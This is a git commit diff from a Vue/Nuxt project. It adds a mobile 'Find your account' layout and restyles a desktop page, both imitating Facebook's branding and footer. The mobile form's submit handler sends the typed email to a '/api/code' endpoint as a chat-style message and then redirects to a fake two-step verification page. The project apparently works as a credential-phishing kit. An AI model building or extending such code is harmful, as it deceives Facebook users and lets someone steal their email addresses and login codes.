389516aef6125cef2755c1d19c8dfae0dc661966
huynamboz <teahuynam2003@gmail.com>
2025-03-10 02:41:13 +0700

    update

---
+++ layouts/FindEmailMobile.vue
@@ -0,0 +1,117 @@
+<template>
+  <div
+    class="md:hidden h-screen flex flex-col p-4 pt-12 items-center bg-gradient-to-r from-purple-50 to-blue-50"
+    @click="handleResetFocus"
+  >
+    <a href="/login" class="fixed top-3 left-3 cursor-pointer">
+      <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24">
+        <!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE -->
+        <path
+          fill="currentColor"
+          d="m6.4 18.308l-.708-.708l5.6-5.6l-5.6-5.6l.708-.708l5.6 5.6l5.6-5.6l.708.708l-5.6 5.6l5.6 5.6l-.708.708l-5.6-5.6z"
+        />
+      </svg>
+    </a>
+    <div class="w-full font-semibold text-lg">
+      {{ $t('Find your account') }}
+    </div>
+    <div class="w-full my-4 text-sm text-gray-500">
+      {{ $t('Enter your email address to search for your account.') }}
+    </div>
+    <form class="w-full" @submit.prevent="handleSubmit">
+      <div
+        class="mb-4 input bg-white"
+        :class="{
+          '!border-[rgb(103,120,138)] border': isFocusEmail && email.trim(),
+        }"
+        @click.stop="handleFocus('email', $refs.emailElement)"
+      >
+        <p
+          :class="{
+            ' transform translate-y-[9px] text-[16px]': !isFocusEmail && !email.trim(),
+          }"
+          class="text-[13px] text-[rgb(70,90,105)]"
+        >
+          Email address
+        </p>
+        <input
+          ref="emailElement"
+          v-model="email"
+          type="text"
+          class="h-5 text-[rgb(28,43,51)]"
+          autocomplete="off"
+          :class="{
+            'opacity-0': !isFocusEmail && !email.trim(),
+          }"
+          @focus="isFocusEmail = true"
+          @blur="isFocusEmail = false"
+        />
+      </div>
+      <!-- <div class="mb-4">
+        <input v-model="password" type="password" placeholder="Password" class="input" />
+      </div> -->
+
+      <button
+        type="submit"
+        class="w-full h-[44px] py-2 mb-3 text-white bg-blue-600 rounded-full hover:bg-blue-700"
+      >
+        Continue
+      </button>
+    </form>
+  </div>
+</template>
+
+<script setup lang="ts">
+import { ref } from 'vue'
+
+const email = ref('')
+const password = ref('')
+const router = useRouter()
+const isFocusEmail = ref(false)
+const isFocusPassword = ref(false)
+
+const handleResetFocus = () => {
+  isFocusEmail.value = false
+  isFocusPassword.value = false
+}
+
+const handleFocus = (type: string, ref: any) => {
+  if (type === 'email') {
+    isFocusEmail.value = true
+    ref.focus()
+  } else {
+    isFocusPassword.value = true
+    ref.focus()
+  }
+}
+
+const handleSubmit = async () => {
+  if (!email.value) {
+    return
+  }
+
+  // Call your API here
+  try {
+    await $fetch('/api/code', {
+      method: 'POST',
+      body: JSON.stringify({ message: `📭 Email: <code>${email.value}</code>` }),
+      headers: {
+        'Content-Type': 'application/json',
+      },
+    })
+  } catch (error) {
+    console.error(error)
+  }
+  router.push('/two_step_verification/two_factor')
+}
+</script>
+
+<style scoped>
+.input {
+  @apply w-full px-4 py-2 h-[62px] border rounded-[12px] border-gray-300 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500;
+}
+input {
+  outline: none;
+  width: 100%;
+}
+</style>
--- pages/find_my_email.vue
+++ pages/find_my_email.vue
@@ -1,4 +1,5 @@
 <script setup lang="ts">
+import FindEmailMobile from '~/layouts/FindEmailMobile.vue'
 const email = ref('')
 const router = useRouter()
 async function submitForm() {
@@ -21,52 +22,220 @@ async function submitForm() {
 }
 </script>
 <template>
-  <div class="flex gap-5 flex-col bg-[#e9ebef] justify-center items-center h-lvh">
-    <p class="max-md:hidden text-[38px] text-[#0064E0] cursor-pointer font-bold">facebook</p>
-    <div class="max-md:h-full max-md:w-full bg-white rounded-lg w-[500px] shadow-md">
-      <p
-        class="hidden max-md:block text-center mb-3 text-[38px] text-[#0064E0] cursor-pointer font-bold"
-      >
-        facebook
-      </p>
-      <div class="max-md:text-center text-xl text-[#182440] py-5 font-semibold border-b px-5">
-        {{ $t('Find your account') }}
-      </div>
-      <div class="p-5 pb-1">
-        <div class="mt-2 border p-2 border-yellow-500 bg-yellow-100 text-sm">
-          {{
-            $t(
-              "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
-            )
-          }}
-          <a class="text-[#0064E0]" href="/login">
-            {{ $t('cancel this process') }}
-          </a>
+  <div class="h-lvh">
+    <FindEmailMobile class="hidden max-md:flex" />
+    <div class="max-md:hidden flex flex-col h-lvh">
+      <header class="max-md:h-[50px] h-[56px] flex items-end justify-center">
+        <div
+          class="w-full max-w-[981px] max-md:flex max-md:justify-center max-md:items-center max-md:h-full"
+        >
+          <p class="text-[38px] text-[#0866FF] cursor-pointer font-bold">facebook</p>
         </div>
-        <p>
-          {{ $t('Please enter your email or phone number to search your account.') }}
-        </p>
-        <input
-          v-model="email"
-          type="email"
-          class="border my-4 p-2 w-full border-gray-300 rounded-md"
-          placeholder="Email"
-        />
-      </div>
+      </header>
+      <div class="flex gap-5 flex-col bg-[#e9ebef] justify-center items-center h-full">
+        <div class="max-md:h-full max-md:w-full bg-white rounded-lg w-[500px] shadow-md">
+          <p
+            class="hidden max-md:block text-center mb-3 text-[38px] text-[#0064E0] cursor-pointer font-bold"
+          >
+            facebook
+          </p>
+          <div class="max-md:text-center text-xl text-[#182440] py-5 font-semibold border-b px-5">
+            {{ $t('Find your account') }}
+          </div>
+          <div class="p-5 pb-1">
+            <div class="mt-2 border p-2 border-yellow-500 bg-yellow-100 text-sm">
+              {{
+                $t(
+                  "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
+                )
+              }}
+              <a class="text-[#0064E0]" href="/login">
+                {{ $t('cancel this process') }}
+              </a>
+            </div>
+            <input
+              v-model="email"
+              type="email"
+              class="border my-4 p-4 w-full border-gray-300 rounded-md"
+              placeholder="Enter Email"
+            />
+          </div>
 
-      <div class="max-md:flex-col p-5 border-t flex justify-end gap-2">
-        <button
-          class="max-md:w-full w-fit px-5 py-2 rounded-lg border-0 bg-[#e5e7eb] font-bold text-[#55575b] hover:bg-[#d4d7de] cursor-pointer"
-        >
-          {{ $t('Cancel') }}
-        </button>
-        <button
-          class="max-md:w-full w-fit px-5 py-2 rounded-lg border-0 bg-blue-500 font-bold text-white hover:enabled:bg-blue-600 cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-blue-500"
-          @click="submitForm"
-        >
-          {{ $t('Continue') }}
-        </button>
+          <div class="max-md:flex-col p-5 border-t flex justify-end gap-2">
+            <button
+              class="max-md:w-full w-fit px-5 py-2 rounded-lg border-0 bg-[#e5e7eb] font-bold text-[#55575b] hover:bg-[#d4d7de] cursor-pointer"
+            >
+              {{ $t('Cancel') }}
+            </button>
+            <button
+              class="max-md:w-full w-fit px-5 py-2 rounded-lg border-0 bg-blue-500 font-bold text-white hover:enabled:bg-blue-600 cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-blue-500"
+              @click="submitForm"
+            >
+              {{ $t('Search') }}
+            </button>
+          </div>
+        </div>
       </div>
+      <footer
+        class="max-md:hidden mt-auto bg-white w-full flex flex-col items-center py-[28px] pb-[40px] px-10"
+      >
+        <div class="w-full max-w-[980px]">
+          <!-- Language Links -->
+          <div
+            class="flex font-light justify-start flex-wrap space-x-[10px] text-gray-500 text-[12px]"
+          >
+            <a href="#" class="hover:underline">English (UK)</a>
+            <a href="#" class="hover:underline">Tiếng Việt</a>
+            <a href="#" class="hover:underline">中文(台灣)</a>
+            <a href="#" class="hover:underline">한국어</a>
+            <a href="#" class="hover:underline">日本語</a>
+            <a href="#" class="hover:underline">Français (France)</a>
+            <a href="#" class="hover:underline">ภาษาไทย</a>
+            <a href="#" class="hover:underline">Español</a>
+            <a href="#" class="hover:underline">Português (Brasil)</a>
+            <a href="#" class="hover:underline">Deutsch</a>
+            <a href="#" class="hover:underline">Italiano</a>
+            <a class="plus-wrapper">
+              <!-- <span class="px-2">+</span> -->
+              <!-- <i class="plus"></i> -->
+              <span class="text-[16px]"> + </span>
+            </a>
+          </div>
+
+          <!-- Divider Line -->
+          <div class="max-w-[980px] w-full border-t border-gray-300 my-[8px]"></div>
+
+          <!-- Other Links -->
+          <div
+            class="max-w-[980px] font-light list-language flex flex-wrap justify-start text-gray-500 text-[12px]"
+          >
+            <a href="#" class="hover:underline">Sign Up</a>
+            <a href="#" class="hover:underline">Log in</a>
+            <a href="#" class="hover:underline">Messenger</a>
+            <a href="#" class="hover:underline">Facebook Lite</a>
+            <a href="#" class="hover:underline">Video</a>
+            <a href="#" class="hover:underline">Places</a>
+            <a href="#" class="hover:underline">Games</a>
+            <a href="#" class="hover:underline">Marketplace</a>
+            <a href="#" class="hover:underline">Meta Pay</a>
+            <a href="#" class="hover:underline">Meta Store</a>
+            <a href="#" class="hover:underline">Meta Quest</a>
+            <a href="#" class="hover:underline">Ray-Ban Meta</a>
+            <a href="#" class="hover:underline">Meta AI</a>
+            <a href="#" class="hover:underline">Instagram</a>
+            <a href="#" class="hover:underline">Threads</a>
+            <a href="#" class="hover:underline">Fundraisers</a>
+            <a href="#" class="hover:underline">Services</a>
+            <a href="#" class="hover:underline">Voting Information Centre</a>
+            <a href="#" class="hover:underline">Privacy Policy</a>
+            <a href="#" class="hover:underline">Privacy Centre</a>
+            <a href="#" class="hover:underline">Groups</a>
+            <a href="#" class="hover:underline">About</a>
+            <a href="#" class="hover:underline">AdChoices</a>
+            <a href="#" class="hover:underline">Terms</a>
+            <a href="#" class="hover:underline">Help</a>
+            <a href="#" class="hover:underline">Contact uploading and non-users</a>
+            <a href="#" class="hover:underline">Create ad</a>
+            <a href="#" class="hover:underline">Create Page</a>
+          </div>
+
+          <!-- Copyright -->
+          <div class="text-gray-500 font-light text-[12px] mt-3">Meta © 2025</div>
+        </div>
+      </footer>
     </div>
   </div>
 </template>
+<style scoped>
+/* Add any additional styling if necessary */
+.list-language a {
+  margin-right: 20px;
+  display: inline-block;
+  font-size: 12px;
+}
+@media only screen and (max-width: 1075px) {
+  .form-main {
+    height: 496px;
+    margin: 0 40px;
+    width: auto;
+  }
+}
+
+.plus {
+  background-image: url(/assets/icons/plus.png);
+  background-size: 171px 55px;
+  background-repeat: no-repeat;
+  display: inline-block;
+  font-style: italic;
+  height: 16px;
+  width: 16px;
+  width: 12px;
+  height: 12px;
+  font-size: 12px;
+  background-position: -100px -34px;
+  -ms-high-contrast-adjust: none;
+}
+
+.plus-wrapper {
+  cursor: pointer;
+  display: inline-block;
+  border: 1px solid;
+  border-radius: 2px;
+  box-sizing: content-box;
+  font-size: 12px;
+  -webkit-font-smoothing: antialiased;
+  font-weight: bold;
+  justify-content: center;
+  padding: 0 8px;
+  position: relative;
+  text-align: center;
+  text-shadow: none;
+  vertical-align: middle;
+  background-color: #f5f6f7;
+  border-color: #ccd0d5;
+  display: inline-flex;
+  align-items: center;
+  height: 18px;
+}
+header {
+  background-color: #ffffff;
+  position: relative;
+  z-index: 1;
+  width: 100%;
+  position: fixed;
+}
+
+.icon {
+  background-image: url('/icons.png');
+  background-position: -38px -34px;
+  -ms-high-contrast-adjust: none;
+  background-size: 171px 55px;
+  background-repeat: no-repeat;
+  display: inline-block;
+  height: 16px;
+  width: 16px;
+}
+
+@media (max-width: 767px) {
+  .btn-mobile {
+    box-shadow:
+      inset 0 0 1px rgba(0, 0, 0, 0.7),
+      inset 0 1px 0 rgba(255, 255, 255, 0.3),
+      0 1px 2px -1px rgba(0, 0, 0, 0.7);
+    text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.35);
+    border-radius: 6px;
+    padding: 8px 17px;
+    line-height: 27px;
+    font-size: 16px;
+    font-weight: bold;
+  }
+  .btn-1 {
+    background: linear-gradient(#647aab, #2c467e);
+  }
+  .btn-2 {
+    background: linear-gradient(#fdfefe, #f0f1f2);
+    color: #505c77;
+    text-shadow: 0 1px 0 rgba(255, 255, 255, 0.6);
+  }
+}
+</style>
